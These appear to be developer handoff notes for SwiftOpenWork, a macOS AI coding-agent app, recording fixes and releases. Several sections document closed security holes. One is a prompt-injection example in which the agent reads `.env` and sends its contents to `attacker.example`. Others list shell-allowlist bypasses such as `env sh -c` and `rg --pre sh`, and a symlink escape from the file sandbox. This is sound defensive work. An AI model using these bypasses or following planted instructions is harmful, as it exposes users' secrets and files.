- Tools: `preview_start` (approval + sandbox + safety level, like `terminal_command`; a `url`-only
  attach needs none), `preview_check`, `preview_logs` (read-only, allowed in plan mode),
  `preview_stop`. The system prompt tells the agent to check web UIs rather than trust a build.
- Reload-on-change is on for static sites and off for dev servers, which hot-reload themselves.

### Found on the way

- **`requiresApproval: true` on `run_app`, `git_commit` and `worktree_remove` was read by nothing**
  — they ran without asking, and plan mode offered them. `approvalReason` now covers them, plan
  mode blocks them, and `testEveryCatalogApprovalFlagIsEnforced` fails for any future tool whose
  flag is not enforced.
- **The test data isolation recorded on 2026-09-16 was not in the code.** `StorageService.baseDirectory`
  always returned the real folder; every `swift test` rewrote the real `settings.json` and
  `mcp_servers.json` (restored by careful tests, which is luck, not isolation). It now uses
  `$TMPDIR/SwiftOpenWork-tests-<pid>` under XCTest, and `SWIFTOPENWORK_DATA_DIRECTORY` overrides
  both. Verified by diffing real-data mtimes around a full run. One side effect, reported rather than
  hidden: a smoke launch made *before* the fix loaded the real data and re-saved `settings.json`,
  `mcp_servers.json`, `providers.json` (same sizes) and `tools.json` (grew by the four preview
  tools, which a normal launch adds anyway). Sessions, agents, automations and workspaces were not
  written.
- The three failing tests: `testTemplatedListsAreAlsoFlagged` asserted a false positive the
  detector no longer has (flipped, plus a test that real repetition is still caught);
  `testTheBuiltBundleMatchesAppIdentity` now skips outside the app host (its guard missed
  `com.apple.dt.xctest.tool`).
- The "SwiftOpenWork Local Signing" certificate exists in the login keychain now; Debug builds sign.

### Added the same day: inline AI suggestions and several previews

**Inline suggestions** (`Sources/Engine/Editor/InlineSuggestions.swift`, ghost text in `CodeTextView`):

- Requested 0.5s after typing pauses, only where inserting cannot split a word
  (`InlineSuggestionPolicy`), cancelled by the next keystroke. ⇥ accepts (one undo step), esc or a
  cursor move dismisses, typing the suggested characters keeps the rest.
- **Never queues.** `NativeMLXService.oneShot` uses `LocalGenerationGate.tryAcquire`: if a chat turn,
  automation or sub-agent holds the model, no suggestion. It never evicts a different resident model,
  never touches `cachedChats`, and passes `enable_thinking: false` (Ornith's template honours it).
- **Two measured fixes.** Asked for "only the text at the cursor", Ornith continued `sum +` with
  ` .amount`, and it ran the full 96 tokens writing new functions (6.9s). The prompt now asks for the
  line restated then continued; `InlineSuggestionStopper` ends generation when the line (or the block
  it opens) is complete; `InlineSuggestionCleaner` strips the restated part and short operator
  overlaps (it once answered `+ item.amount` after `sum +`). Result: correct lines in 0.8–1.1s warm,
  ~3s cold (`InlineSuggestionLiveTests`, `SOW_LIVE_MLX=1`).
- **Model choice** (`InlineSuggestionModelChoice`): Automatic = the chat model *only when it is local*;
  a cloud chat model gives "choose a model" rather than sending code anywhere. Explicit choice in the
  editor status bar or Settings (`inlineSuggestionsEnabled`, `inlineSuggestionProviderId`,
  `inlineSuggestionModelId`).
- Verified in the running app: typing `function formatMoney(value) {` / `  return ` produced ghost
  text `value.toLocaleString('en-US', { style: 'currency', currency: 'USD' });`. Accepting with ⇥
  could not be driven from the automation tool (it cannot send raw keys to a background window); it is
  covered by `GhostTextBehaviourTests` on a real `CodeTextView`.

**Several previews** (`PreviewSessions`): up to six tabs, each a `PreviewController` with its own web
view, console, viewport and server; layouts One at a Time / Side by Side / Stacked (pane menu and a new
**Preview** menu). `PreviewLauncher` reuses the tab showing a server, else an idle tab, else opens a new
one, so a second server never replaces the first page. `preview_start` takes `new_tab`,
`preview_check` takes `tab` (number or text in title/URL — `"5173"` is a port, not tab 5173, unless
that tab exists), `preview_logs` reports every tab. There is always at least one tab, so SwiftUI never
creates one mid-render. Verified live: two static servers in two tabs with separate consoles
(`PreviewSessionsTests`), and side by side in the running app.

**Smoke-test trap:** copying the real `providers.json` into a throwaway data folder makes the rebuilt
binary read cloud API keys from the Keychain at launch, on the main thread, before the window exists —
it hangs behind a Keychain prompt with no window. Copy only `type == "local"` providers.

### Smoke-testing the UI safely

```bash
SWIFTOPENWORK_DATA_DIRECTORY=/path/to/throwaway XCTestBundlePath=/dev/null \
  build/DerivedData/Build/Products/Debug/SwiftOpenWork.app/Contents/MacOS/SwiftOpenWork
```

The first variable points the data folder somewhere disposable; the second blocks startup
automations and the update check. UserDefaults (window layout) is still the real domain — export it
with `defaults export io.github.foscoe63.SwiftOpenWork` first and import it afterwards.

### Not done, on purpose or for later

- **Ghost-text is pause-based, not per-keystroke.** After typing pauses, the idle local model may
  suggest a continuation. It never queues behind an agent turn and never swaps the resident
  checkpoint. Fill-in-the-middle prompting on every keystroke is still refused: a 35B model does
  not meet that latency budget.
- ~~One preview at a time~~ — tabs and split layouts were added the same day (see above).
- **Highlighting is whole-document** on a background queue, debounced. Fine to ~1MB; files beyond
  1.5MB UTF-16 are shown uncoloured.
- `preview_start` asks for approval even when detection picks the built-in static server.

---

## What landed 2026-09-17 (eighth pass): launch, palette, project search

- **No Keychain reads at launch.** `PersistenceManager.loadProviders()` hydrated every cloud key on
  the main thread inside `AppState.loadAll()`, before the window existed; after any signature change
  each read can raise a prompt, and launch hung with no window (reproduced in a smoke test). Keys now
  load on first use through `ProviderCredentials.hydrated` inside `OpenAIService`/`AnthropicService`
  (streamChat, testConnection, listModels), off the main thread and cached — misses too, so a denied
  prompt is not repeated. `AppState.loadProviderKeysForDisplay()` fills key fields when the provider
  settings screens open. `saveProviders` never deletes a key it was handed empty, so un-hydrated
  saves are safe. Verified: the rebuilt app with seeded cloud providers opened its window immediately.
  Google secrets go through `GoogleCredentialStore` (cached; Keychain reads and writes on a serial
  background queue). The Google settings page awaits `GoogleIntegrationsService.loadCredentials()`
  and keeps its fields disabled until it returns; putting the loaded values back into the fields
  writes nothing (it used to rewrite all five items on every open, and one per keystroke on the
  main thread). `GoogleCredentialStoreTests`.
- **Command palette (⌘K)**, replacing the Spotlight dialog in place (`SpotlightSearchView`):
  `PaletteCommands`, `PaletteRanker` (prefix > word start > initials > substring > subsequence,
  recents boosted), `PaletteRecents`. Rows are buttons (a tap gesture was not clickable through
  accessibility and not reachable by VoiceOver).
- **Find in Project (⇧⌘F)**: `ProjectSearch` (pure; columns for selection; open documents' text
  instead of disk; binary and >2MB files skipped; 5,000-match cap) and `ProjectSearchPanel` /
  `ProjectSearchModel` (debounced, cancellable). `EditorWorkspace.open(path:line:selecting:)` selects
  the match. Replace All uses `EditorDocument.applyEdit` — unsaved, one undo step, capped at 40 files.
- **CI**: `ExecutableLocator.isInertRustupProxy` — rustup's `rust-analyzer` proxy exists without the
  component and was treated as installed (the only CI failure). The npm lifecycle test no longer
  assumes the server is a child of the launched shell.

## Notarisation works (2026-09-19)

- **Credentials:** a notarytool keychain profile, `swiftopenwork`, for Apple ID
  `deepgapnc@gmail.com`, team `5XKHL47YG3`, with an app-specific password. Stored with
  `xcrun notarytool store-credentials`. No App Store Connect API key is needed.
- **Script:** `Scripts/notarize-release.sh` accepts `NOTARY_PROFILE` as an alternative to the
  `APPLE_API_*` key variables. A full release is now:

  ```bash
  DEVELOPER_ID_APP="Developer ID Application: Edward Griswold (5XKHL47YG3)" NOTARY_PROFILE=swiftopenwork Scripts/notarize-release.sh
  ```

  It takes about 10 minutes on this machine: build, sign, a few minutes in Apple's queue, staple,
  zip. `spctl` then reports `accepted, source=Notarized Developer ID`.
- **Version:** bumped to 1.3.1, build 4, in both `project.yml` and `project.pbxproj` (the
  checked-in project is edited directly, not regenerated). 1.3.1 carries the 20 commits after the
  `1.3.0` tag: the module split, Swift 6 language mode, test-host isolation and the SourceKit and
  TypeScript fixes.
- **Built 2026-09-19:** submission `b0952c9a-4ba6-4cab-ace8-f91636021e79`, Accepted and stapled.
  `build/release/SwiftOpenWork.zip`, 52.5MB, sha256
  `6529c2d2022a27bf8ec3ef19609471eb5d7820354dc1979a78ba62af96b82fca`.
- **1.3.2 (build 5), 2026-09-19:** built from `main` at `94161f4` (PR #21 merged) in a separate
  worktree so a test run in the main checkout was not disturbed. Submission
  `214329d1-783e-4eca-bb0d-30f115244868`, Accepted and stapled; `spctl` reports
  `Notarized Developer ID`. Zip 52.7MB, sha256
  `a33b836d6f707585d1cac84ae5a79c55e307f7af585978e958746489c00de668`. Installed over 1.3.1 in
  `/Applications`; the Developer ID is unchanged, so privacy grants given to 1.3.1 carry over.
- **1.3.3 (build 6), 2026-09-19:** built from `main` at `a3c2eca` (PR #26 merged) plus the
  version bump and the repository URL change, in its own worktree. Submission
  `0be76e5d-e333-4bf7-aadb-22a0c3e8aa96`, Accepted and stapled; `spctl` reports
  `Notarized Developer ID`. Zip 52.8MB, sha256
  `a54bd1a42e6f8726e275b09e2aa52586bb85c8f76985c06a735a0a5ad45feb46`. Installed over 1.3.2 in
  `/Applications`. The release tests (`RenameToSwiftOpenWorkTests`, `UpdateCheckerTests`,
  `SandboxContainmentTests`) ran in the worktree before the build.
- **1.3.4 (build 7), 2026-09-19:** built from `main` at `64dbb4f` (PR #30 merged) plus the
  version bump. A first 1.3.4 build from `3e3e8a8` was notarised and then discarded unpublished,
  so the release would not ship the allowlist hole #30 closes. Submission
  `89eda58f-42c2-4df0-b383-2f726e84e2ab`, Accepted and stapled; `spctl` reports
  `Notarized Developer ID`. Zip 52.9MB, sha256
  `2d216a61aaf44cde8966b2470a6d22e73f5f72e0953f9f82865cac9434bbecbe`. Installed over 1.3.3 in
  `/Applications`.

## The vibe-coding loop: new projects and saving progress (2026-09-19)

A review of the prompt → watch → see → fix loop found it well covered (queued follow-ups, image
paste, preview errors into the composer, rules files, rewind). The gaps were at the two ends:
starting a project and keeping a version that works.

- **New workspaces get a git repository.** `WorkspaceBootstrap` runs when a workspace is created:
  a new or empty folder (Finder metadata and the staging folders do not count) gets the chosen
  starter files, a `.gitignore`, `git init` and a first commit. Session diffs, agent worktrees and
  `git_commit` all need a repository and silently had none on a fresh workspace. A folder that
  already has files is only registered; a folder inside an existing repository gets the files but
  no nested repository. No git identity → no first commit, and the toast says why.
- **Starter templates.** "Start From" in both new-workspace sheets: empty, static site, React
  (Vite), SwiftUI Mac app (Swift package), Python script. Each carries an `AGENTS.md` telling the
  agent how to run and check that kind of project. The SwiftUI and Python starters were built and
  run; the React one was not (`npm install` downloads packages), only its `package.json` parsed.
- **One place creates workspaces.** `AppState.createWorkspace` replaces two copies of the same
  inline code in `WorkspaceSwitcherMenu` and `SettingsView`.
- **No more `input/` and `output/` in code projects.** New workspaces get the staged pipeline only
  when the category is not Project and no starter was chosen. Existing workspaces are unchanged
  (this repo's own `input/`/`output/` came from that default).
- **You can commit from the app.** "Commit…" in the session change review stages and commits the
  session's files that git still sees as changed, with a checkbox per file and an editable
  message. `SessionCommit` uses `git commit -- <paths>`, so anything else you had staged stays
  staged and out of the commit. It is not a tool: the agent still cannot commit on your checkout.
- **Editor selections mention as ranges.** "Mention in Chat" sends `@path:first-last` for a
  selection (`EditorText.lineSpan`; a whole-line selection's trailing newline does not add a
  line), and the composer attaches exactly those lines, capped at 400.

Tests: `WorkspaceBootstrapTests`, `SessionCommitTests`, and range cases in `VibeCodingSurfaceTests`.

## Show, don't tell: pointing, pictures and self-checks (2026-09-19)

- **Errors ride along with edits.** After `file_write`, `edit_file` or `multi_edit`, a language
  server that is *already running* for the file is asked for diagnostics (4s cap, errors only, 10
  lines) and the verdict is appended to the tool result — "sourcekit-lsp reports 1 error in …" or
  "… reports no errors in …". `LanguageServerPool.runningSession(for:)` never starts, restarts or
  waits for a server, so a cold workspace's edits are exactly as before. The instructions already
  said to verify; smaller local models skip it, and now they see their error in the same step.
  `testEditsCarryErrorsFromAServerThatIsAlreadyRunning` runs it against real sourcekit-lsp.
- **Select an element in the preview.** The cursor button on the preview toolbar injects
  `PreviewElementPicker.startScript`: hover highlights with a size label, the next click is
  swallowed (a button is picked, not pressed), Escape cancels, a navigation ends pick mode. The
  pick — selector, tag, text, outer HTML (1,500 chars), frame — goes into the message box as a
  block to write around, with a screenshot cropped to the element. `PreviewElementPickerTests`
  drives the script in a real web view.
- **Screenshot to chat.** The camera button attaches a PNG of the page as shown.
  `AppState.addToComposer(text:attachments:)` and `composerAttachmentInbox` are how anything
  outside the composer adds attachments; the composer takes and clears the inbox.
- **Empty-chat suggestions fit the workspace.** `StarterSuggestions` reads the top level only:
  an empty folder (git, `.gitignore`, `AGENTS.md` and staging folders do not count) gets four
  small things to build; a web, Swift or Python project gets explain / run-and-check (preview,
  build + screenshot, or run + tests) / find and fix a bug / add tests. The four fixed demo cards
  about SwiftOpenWork itself are gone.

## Sandbox symlink escape closed; session review off the main thread (2026-09-19)

- **The file sandbox could be walked around through a symlink.** `canonicalPath` resolved
  symlinks only in the file's immediate parent, and only when that parent existed. With a link
  `escape → /somewhere/outside` in the workspace, `file_write` to `escape/newdir/file.txt` passed
  the containment check — `newdir` did not exist, so nothing was resolved and the path still looked
  inside — and `writeFile` then created `newdir` on the far side of the link. A cloned repository
  can carry such a link, so a prompt-injected agent could create files anywhere the user can write
  (existing files like `~/.zshrc` were safe: their parent exists and did resolve). It now walks
  the path component by component, following every link (relative, absolute, dangling) and
  applying `..` after the link it follows, as the kernel does, with a 40-link cap for loops. The
  same check guards all 19 file tools and the shell-redirect check.
  `SandboxContainmentTests` covers the escape end to end through `file_write`.
- **Session change review no longer runs git on the main thread.** Opening the sheet ran
  `git status`, and every file click `git diff`, synchronously — a freeze on a large repository
  or diff. Both run detached now, and a slow diff for a file clicked earlier does not overwrite
  the one selected since.

## fetch_url asks per site; chat history saved off the main thread (2026-09-19)

- **`fetch_url` was the one unguarded way out.** File reads need no approval and the default
  shell blocks `curl`, so an instruction planted in a page or README could have the agent read
  `.env` and fetch `https://attacker.example/?d=<contents>`. `WebFetchPolicy` now decides:
  a public host asks the first time in a chat, and approving it allows that host for the rest of
  the chat (`WebFetchAllowlist`, in memory, per session id); loopback, private, link-local, CGNAT,
  `.local`/`.lan` names and odd numeric spellings (`2130706433`, `0x7f.1`) ask every time,
  except this app's own preview servers on loopback. `fetch_url` uses an ephemeral session whose
  delegate refuses a redirect from a public page into the local network — always, whatever the
  setting. **Settings → Advanced → Ask Before Fetching New Sites** (default on) turns the
  questions off for automations that must fetch unattended.
  Sub-agents are unattended: a fetch that would ask is refused and reported, and sites approved in
  the parent chat (carried on `AgentRunContext.Frame.sessionId`) still work.
- **Chat history is no longer rewritten for every streamed chunk.** `onMessageUpdated` fires per
  chunk and called `saveSessions`, which pretty-printed every session and atomically rewrote
  `sessions.json` on the main thread — tens of times a second, growing with history. While a
  reply streams it now saves at most once a second, plus the finished message; and every
  `saveSessions` goes through `SessionWriter`, one background queue where a newer snapshot
  replaces an older one still waiting. `loadSessions` and `applicationWillTerminate` flush first.

## Sub-agents go through approval; edits inside their own worktree do not ask (2026-09-19)

Only `AgentRunner` ever called `ToolApprovalManager.requestApproval`. `SubAgentExecutor` ran its
tools straight through `ToolExecutionEngine.execute`, so `file_delete`, `run_app`, `git_commit`,
`revert_changes` and shell commands under "Always Ask" ran unasked, while the sub-agent's prompt
promised they would be refused and `refusedActions` — built to report them — stayed empty.

`SubAgentToolPolicy.approvalReason` now gates every sub-agent call. It starts from
`AgentRunner.approvalReason` and lets one class through: **file edits whose every path is inside
the sub-agent's own worktree** (write, edit, multi-edit, move, copy, delete, rename; relative
paths resolve against the worktree, symlinks are followed, `.git` is excluded), and `git_commit`
of that worktree. Anything else that would ask is requested inside the unattended scope, so it is
refused, recorded in `refusedActions`, and the model is told not to retry. With no worktree (the
workspace is not a git repository) edits would land in the user's checkout, so they are refused
and the prompt says to read, build and report instead. Copying *into* the worktree from outside
is refused too: it reads outside. `SubAgentToolPolicyTests`.

## The safe-command allowlist ran arbitrary code (2026-09-19)

Terminal Safety Level "Allow Safe Read-Only Commands" is the default, and an allowed command runs
**without asking**. The check looked only at each segment's first word plus a list of banned
substrings, and all of these passed as read-only: `env python3 -c …` / `env sh -c …` (`env` runs
any program), `rg --pre sh` (ripgrep runs the preprocessor on every file), `sort -o FILE`,
`uniq IN FILE`, `tree -o FILE`, `find -fprint FILE`, `git log --output=FILE` (each overwrites
any file), `git branch -D`, `git remote add`. An instruction planted in a page or README could get
code run in one tool call — and that code could send data anywhere, around `fetch_url`'s
approval.

`SafeShellCommand` replaces it: the command is tokenised as the shell reads it (quotes and
backslashes removed, so `'--pre'` and `--pr\e` are seen; unbalanced quotes are refused); `env`,
`printenv`, `less` and `more` are off the list; each command's executing or writing flags are
refused (`find -exec*/-ok*/-delete/-fprint*/-fls`, `rg --pre*`, `sort -o/--output/--compress-program`,
`uniq` with an output operand, `tree -o`, `file -C`, `git --output/--ext-diff/--textconv`,
`hostname`/`date` operands that set things); `git branch` and `git remote` only list; git global
options before the subcommand are refused; and for commands whose danger hangs on a flag an
unquoted glob is refused, because a repository can hold a file named `--pre=sh`. Command names
were dropped from the banned substrings — every command must start with an allowlisted word, and
matching names as text refused `rg "func (x|y)"` (`func ` contains `nc `).
`SafeShellBypassTests` lists every bypass above.

## What one exported session showed (2026-09-21)

A local-model session (`majentik/Qwen3-Coder-Next-MLX-5bit`) asked to improve ProTerm removed one
line in an hour. Every fault below is in that export; the tests are in
`AgentLoopTranscriptTests`.

- **The loop fed each step back wrong.** After the tool results it appended one assistant message
  holding the *whole turn's* text, so the model read its narration after its own results, and once
  more per step — it repeated "# SSH Password Security Fix / Let me examine…" seven times. Each
  step is now an assistant message with only that step's text and its `toolCalls`, *before* the
  results. `finalize` also re-published narration `hideTurnNarration` had hidden; hidden ranges
  are now kept.
- **Cloud providers were never sent the calls.** OpenAI and Anthropic got `tool`/`tool_result`
  messages with no `tool_calls`/`tool_use` in front of them, which both APIs reject.
  `ToolCallPairing` decides what can go native: a call only if its result follows, a result only
  if it answers such a call, anything else as text — so transcripts saved before this still send.
- **The KV cache was rebuilt every step.** `foldOldToolResults` was a sliding window: once four
  results existed, every step folded one more, rewrote history and hit `MLXSessionReuse`'s
  divergence check — fifteen "Context cache reset" notices in one turn. It now folds in batches
  of four.
- **The stuck breaker compared raw strings**, and the model read one script eleven times by
  alternating `file_read`/`read_file` and reordering keys. `callSignature` normalises aliases, key
  order, path-key spellings and whole-number strings. Sub-agents had no breaker at all; they
  now nudge at three identical calls and stop at five.
- **`todo_write {}` cleared the list**, four times running. Missing `items` is now an error;
  only an explicit `[]` clears; a JSON-string list is accepted.
- **`"offset":"80.0"` was ignored** (`Int("80.0")` is nil), so the whole file came back and the
  model asked again. `intArgument` takes whole-number strings and doubles and is used for every
  count and window argument.
- **A mangled path** (`ProTermSourceSSHSessionManager.swift`) now gets "Did you mean
  `ProTerm/Source/SSHSessionManager.swift`?" — separators ignored first, then file name.
- **Xcode builds failed with "0 error(s)"** because `xcode-select` pointed at the Command Line
  Tools (as it does on this machine). The shell environment now sets `DEVELOPER_DIR` to the newest
  installed Xcode in exactly that case; the summary says "before reporting any compiler errors"
  and names the `xcode-select -s` fix when it is still needed.
- **Sub-agent reports:** a timeout now reports the sub-agent's last words instead of nothing; a
  report naming a file whose write was refused gets a warning (the lead had told the user about a
  report file that was never written); changes left on a worktree branch are said to be unmerged.
- **Sessions** never updated `updatedAt` or their token totals, and one opened with a slash
  command was titled after it (`/i-have-adhd`). Both fixed in `Session.recordActivity` /
  `isTitleCandidate`.

Why the delegated work produced nothing mergeable — the second look:

- **Sub-agent worktrees started from the last commit.** The parent had 56 uncommitted files,
  including the ones the sub-agent was asked to change, so it edited versions the user no longer
  had. `AgentWorktree.seedWithUncommittedChanges` now applies the parent's tracked diff, copies
  untracked files and commits them as a snapshot; the report names that commit so the
  sub-agent's own edits are `git diff <snapshot>`.
- **The time limit was checked only between rounds**, so a 600s sub-agent ran 759s. The round in
  flight is now cancelled at the deadline and its partial text reported.
- **The lead did not know the budget.** It gave all ten features to one sub-agent, then, after the
  timeout, features 2–10 again from scratch, never seeing the first one's branch. The team section
  now states the step and minute budget and asks for one change per `agent_spawn`; an unfinished
  report says its work will not carry into a new spawn; the sub-agent is told its own budget and
  to grep and read in windows rather than whole files.
- **A repetition stop left the looping text as the answer.** It now moves to Reasoning and the turn
  ends in a halt with Continue.

Third pass, on what was still open:

- **Every new message re-read the whole conversation.** A turn's steps (step messages, tool
  results, folds) lived only in the loop; the session kept the final reply, so the next message
  sent a history the cache had never seen — and the model had forgotten last turn's tool results.
  `Session.modelContext` now holds the transcript the model last saw, and `modelHistory()`
  continues from it while the session still starts with the messages it covers (same ids, same
  user text); an edit, fork or deletion falls back to the plain messages.
- **Unchanged re-reads.** A `file_read` identical to one that succeeded this turn, on a file not
  modified since, whose result is still unfolded in the transcript, answers "Unchanged since step
  N" instead of re-sending the file.
- **A sub-agent whose provider was on but unreachable** (Ollama enabled, not running) failed the
  delegation on its first call; one switched off fell back to the lead's model. An unreached model
  now falls back the same way, once, before any work (`SubAgentExecutor.failedBeforeStarting`).
  Found by a live delegation run; the test host's isolated settings have Ollama on.
- **Sub-agent reports are labelled as the sub-agent's own account**, and the lead is told to verify
  claims before repeating them.

Not code: in `agents.json` on this machine, `coder-agent` is named "Reviewer-Agent" and
`reviewer-agent` "Coder-Agent", which is why delegations looked mislabelled.

## What is left

### Settings still dead

None. `startOnLogin` is vestigial by design: the toggle reads `SMAppService` directly, because
macOS is the only authority on whether a login item is registered.

### Needs you

- **Re-grant Accessibility and Screen Recording** once, if not done since 1.3.1 was installed
  (System Settings → Privacy & Security), and remove the old OpenWork entries. Grants follow the
  Developer ID signature, so they carry over to 1.3.2 and later notarised builds.
- **Revoke the Firecrawl API key in `config.json`.** The file has been in this public repository
  since the first commit and holds a live-looking `FIRECRAWL_API_KEY`. Removing the file does not
  un-publish the key; only revoking it at Firecrawl does.

### Worth building next

- Nothing listed. (`SwiftOpenWork.podspec` was deleted on 2026-09-19: it named a tag that never
  existed, depended on pods that do not exist and targeted iOS. This is an app, not a pod.)

### Explicitly decided against — with reasons, so they are not re-proposed

**JSON repair that balances braces.** If `file_write`'s `content` is truncated mid-string,
appending `"}` yields valid JSON with silently truncated file content — a half-written file
reported as success, which is the exact failure class this work removed. `ToolExecutionEngine`
already has a repair layer (`coerceJSONMaps`, `parseObjectMap`, `sanitizeToolArgumentsJson`). If
you pursue it: log parse failures first, then repair only provably safe cases, and **never** for
tools that write.

**`.dylib` plugins.** The motivation was IPC latency. Measured: MCP round-trips are milliseconds,
model prefill is seconds. Cost is arbitrary code execution inside the app process, inheriting its
TCC grants (Accessibility, Screen Recording, Contacts, Calendar, Microphone) plus Keychain, with no
approval gate and no revocation. A plugin that needs speed can be a local MCP server in Swift.

**Desktop widgets.** New extension target plus a shared App Group container, and a widget can only
display state, not run agents.

**Session-wide undo *for the agent*.** `FileCheckpointStore.beginTurn` still discards the prior
window on purpose, and `revert_changes` still reaches no further than the turn it is running in.
An agent that can silently revert ten turns of your work is worse than one that cannot revert at
all.

> Amended in the fifth pass: this was over-applied. The argument is about the *agent*, and a
> person picking a point in their own transcript and being shown every file that will change
> first is doing something else. That is `SessionCheckpointStore`, and it is user-initiated,
> previewed and durable. The line to hold is *who* triggers the rewind and whether they see the
> blast radius before it happens — not whether the history exists.

---

## Known issues not fixed

**GrizzyBot's four `GrizzyBotUITests` are not simply environmental (corrected 2026-09-16).** Run
locally from SwiftOpenWork's session, one test passed alone, then two of four and zero of four
passed on consecutive full runs, all failing with "Missing <id>-overlay" rather than a runner
connection error. Flaky locally suggests a timing or launch-state bug in GrizzyBot, not only the
environment. It was not investigated further; the original note follows.
**Previously recorded: they fail environmentally, not from code.** A bare
`WindowGroup { Text("…") }` with none of GrizzyBot's code fails identically under XCUITest, while
the same binary shows its window fine via LaunchServices. CI passes `CODE_SIGNING_ALLOWED=NO`,
which kills the runner before it connects; locally it looks like missing Accessibility permission
for the test runner.

---

## Clicking things: use `.buttonStyle(.hitTestable)`, not `.plain`

`.plain` hit-tests a button against what it **draws**. Two shapes in this app draw almost
nothing:

- a nav row with a `Color.clear` background and a `Spacer()` — only the letters respond, the
  padding and the whole empty middle are dead;
- a bare `Image(systemName:)` — the target is the glyph's strokes, so a click landing between
  the strokes of a thin symbol does nothing, which the user reads as "the icon is broken".

`Sources/UI/Components/HitTestablePlainButtonStyle.swift` behaves like `.plain` but hit-tests the
button's full declared frame. Use it for any borderless control; keep `.plain` only where the
label genuinely fills its frame.

This was reported twice as separate bugs — the inspector tabs, then every icon in the left
sidebar — before it was recognised as one rule.

**The sweep is done.** 70 sites moved to `.hitTestable`; 15 keep `.plain` on purpose — six declare
their own `contentShape`, and nine fill their row or sit in a fixed-width panel, where a wider hit
area would eat a neighbour's clicks, which is the regression the previous version of this note
predicted a blanket change would cause. `HitTestableButtonSweepTests` enforces the rule and names
every exemption, so a new borderless button fails the suite rather than waiting to be reported as
a bug.

Find them with:

```bash
grep -rn 'buttonStyle(.plain)' Sources/
```

## Environment gotchas

**A "dead" region of our UI may be another app's window, not our bug.** A user reported the Agent
Messages inspector tab did nothing while every other tab worked. Hours went into SwiftUI
hit-testing theories — `.contentShape`, `.buttonStyle(.plain)`, tooltip tracking views, glyph
widths — all wrong. The tab was fine. GrizzyBot had a 135x176 always-on-top floating window
(`layer=101`) parked over that strip of the inspector tab bar, eating the clicks.

Two tells that should have redirected the search immediately, and did not:

- The failure was **positional, not per-tab**: moving `comms` to the end fixed it, and whatever
  tab landed in slot 2 then died instead.
- **AXPress worked while a synthetic click did not.** AXPress goes to the app; a click goes to the
  window server, which routes it to the frontmost window at that point. That divergence *is* the
  signature of an occluding window and means the control itself is healthy.

Check the window list before rewriting any view. Four lines:

```bash
python3 -c "import Quartz;[print(f\"layer={w.get('kCGWindowLayer')} {w.get('kCGWindowOwnerName')} {w.get('kCGWindowBounds')}\") for w in Quartz.CGWindowListCopyWindowInfo(Quartz.kCGWindowListOptionOnScreenOnly,0)]"
```

Anything with `layer > 0` overlapping our frame is a suspect. The general rule: when a UI symptom
is positional, suspect the environment before the code.


**`swift build` crashes in the manifest compile** unless the Xcode toolchain is selected:

```bash
export DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/swift test
```

Permanent fix needs your password: `sudo xcode-select -s /Applications/Xcode.app/Contents/Developer`

**Grep build output for `warning:`, not just `error:` — and do it after *every* change, not once.**
This was recorded after two `?? 0 ?? 0` warnings shipped, and then an unused `subAgentStartTime`
shipped anyway, because the sweep was treated as a one-off rather than a habit. The command that
keeps it honest, filtered to this project's own code:

```bash
$SWIFT build --build-tests 2>&1 | grep 'warning:' \
  | grep -vE 'swift-jinja|missing creator|mlx-swift'
```
 Two redundant `?? 0 ?? 0` warnings
shipped in the perception work because every build check in that session filtered for `error:`
alone. `attributesOfItem` throws *and* its subscript returns `Any?`, so the obvious inline
spelling is a `try?` around an `as?`, which yields a doubly-optional and invites exactly that
mistake — `ImageTransport.fileSize(atPath:)` is now the one place that does it.

**The loop breaker stopped covering reasoning the moment reasoning got its own channel.** It was
gated on `deltaText` being non-empty, which held while reasoning arrived inline in the visible
stream. Routing an unclosed `<think>` block to `deltaReasoning` left `deltaText` empty for the
whole turn, so the breaker never ran: an exported session shows **12,117 characters of reasoning
over 192.7 seconds with zero visible output**, stopped by hand. It now checks `fullReasoning` too.
Reasoning models spiral exactly where the visible text never grows, which is what the breaker was
built for — the guard and the thing it guards were separated by a later change to a different file.

**A `.buttonStyle(.plain)` button is only clickable where something is drawn.** No
`.contentShape(Rectangle())` means SwiftUI hit-tests the rendered glyphs — the icon strokes and
the letters — not the frame or the padding. It is invisible in a screenshot and unmistakable in
use: a *selected* tab paints an opaque background so its whole area works, while every unselected
one has a hit target the size of its text. Reported as "the icons at the top are very small and
hard to choose". Fixed in the inspector tab bar and the Settings sidebar; the pattern is common
across `Sources/UI` and only matters where the background is `Color.clear`.

**The thinking panel had no way to get text out of it** — not selectable, no copy button. That is
the one place holding the evidence when a turn goes wrong, and it could not be reported or
diagnosed. Both added.

**Dead-end detection only ever covered MCP.** `mcpDeadEnds` warns at 3 and disables MCP at 5, and
nothing equivalent existed for first-party tools — so one could fail identically forever. Observed:
a model called `screenshot_window` with the same arguments eight times and was still going when
the user stopped it by hand. `AgentRunner.callSignature` + `identicalFailureLimit` now refuse the
third identical failing call and tell the model why. Two, not one, because a single retry after a
transient failure is reasonable.

**`MLXVLM` was not linked, so vision models loaded as text-only.** `NativeMLXService` loaded every
checkpoint through `LLMModelFactory`, which builds a pipeline with no vision tower and no image
processor — images handed to it in `Chat.Message.images` are dropped in silence. The factory now
branches on `LocalMLXEngine.declaresVisionSupport`, and `MLXVLM` is a declared dependency in both
`Package.swift` and `project.yml`.

**`.contextMenu` on a container swallows text selection.** It was attached to the whole message
bubble, which installs a hit-testing region over the entire subtree and eats the mouse drag
`.textSelection(.enabled)` depends on — so replies were marked selectable, could not be selected,
and clicks aimed at the buttons inside the bubble were intercepted on the way. It now hangs off
the avatar. **Never put `.contextMenu` on a view that contains selectable text.**

**Changing the signing identity makes the Keychain treat the app as a stranger.** Signing with
the new certificate immediately hung the app at launch with no window: `AppState.loadAll()` →
`loadProviders()` → `KeychainManager.getSecret` → blocked on securityd, because a
differently-signed binary needs fresh authorisation for every stored item, and that happens on
the main thread *before the window exists*. `sample <pid>` is how to see it; a running
`SecurityAgent` process is the tell that a dialog is waiting somewhere.

Answer "Always Allow", once per item. Hydration now only queries **cloud** providers, so that is
one prompt rather than ten — local providers have no API key concept and were being queried for
one anyway.

**Ad-hoc signing silently kills TCC permissions on every rebuild.** This cost an hour and looks
like nothing else. With no Developer ID the app was ad-hoc signed, so macOS identified it by the
binary's *content hash*: each rebuild invalidated Accessibility and Screen Recording **while
leaving the app ticked in System Settings**. It reads "granted" and behaves "denied", and the
perception tools fail with a permission error you can see is already granted.

Fixed by signing local builds with a self-signed certificate — `Scripts/create-local-signing-cert.sh`,
